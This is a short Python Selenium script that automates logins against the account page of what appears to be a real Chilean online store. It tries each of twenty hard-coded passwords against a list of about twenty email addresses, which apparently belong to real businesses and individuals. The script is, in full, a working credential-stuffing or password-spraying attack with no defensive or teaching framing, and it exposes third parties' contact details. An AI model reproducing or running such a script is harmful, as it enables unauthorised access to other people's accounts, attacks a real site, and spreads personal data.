#LIBRARIES
import string, random, time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
#/usr/local/bin/chromedriver
driver_path = '/usr/local/bin/chromedriver'

if __name__ == "__main__":
    #Variables
    options = webdriver.ChromeOptions()
    options.add_argument('--start-maximized')
    options.add_argument('--disable-extensions')

    driver = webdriver.Chrome(driver_path, chrome_options=options)
    correos=[" "," ","alvarob@flesan.cl","cobranzas@flosam.cl","rleiva.construccion@gmail.com","aperez@insap.cl","contabilidad@matesan.cl","contabilidad@matesan.cl","cobranzas@jorrattyzamora.cl","cobranzas@lemaco.cl","proyecto@constructoravf.cl","alejandra.sandoval.p@gmail.com","administracion@transial.cl","dnavarro@sielempresas.cl","ccastillo@empresasfg.com","finanzas.esinco@gmail.com","gabriela.avila@grupohabitante.cl","fiercomlimitada@gmail.com","sjorquera@ecoenergychile.com","andres.gajardo@dcj.cl","VENTAS@TECKUP.CL"]
    contrasenas=["2DJo8p5^uGC^","FUKVjteA^kz*","Z$heIGazSEjz","c$@PlR3KTayt","sGU%Oygpjz4O","1H3Otbu0&ikW","Jh$dZpw%pdUw","08isaojoasl","q%Q%@DUVUpyg","F$wsIYM&OIW3", "Gpg8rD@bhZwR", "5NP^JlQ*tR^k", "2jhiYAn$UgeW", "0*1Dl%EiJMd^", "zTE*$G$gWRTI", "&BkruSC@7cg0", "L$0HtXJqihE0", "BOgk&mufuReq", "1E%MiiF0*V7H", "xk!6POKJwzoe"]

    print(correos.__len__())
    print(contrasenas.__len__())
    
    #Iniciar interfaz 
    driver.set_window_position(1000,0)
    driver.maximize_window()
    time.sleep(1)


    #Inicializamos el navegador
    driver.get('https://www.entrejuegos.cl/iniciar-sesion?back=my-account')
    time.sleep(5)
    for i in contrasenas:
        for j in correos:

            email = driver.find_element_by_name("email")
            email.clear()
            time.sleep(1)
            email.send_keys(j)
            pwd = driver.find_element_by_name("password")
            pwd.clear()
            pwd.send_keys(i)
            driver.find_element_by_id("submit-login").click()
            time.sleep(2)

    driver.close()